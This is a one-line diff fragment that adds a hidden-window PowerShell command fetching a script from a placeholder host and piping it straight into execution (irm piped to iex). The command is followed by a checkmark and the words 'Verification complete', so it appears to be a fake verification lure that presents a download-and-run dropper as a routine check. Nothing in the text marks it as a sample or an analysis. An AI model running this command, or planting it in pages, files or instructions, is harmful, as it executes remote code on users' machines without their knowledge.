@@ -1,0 +1,1 @@
+powershell -w hidden -c "irm https://example.invalid/g|iex"  ✅ Verification complete
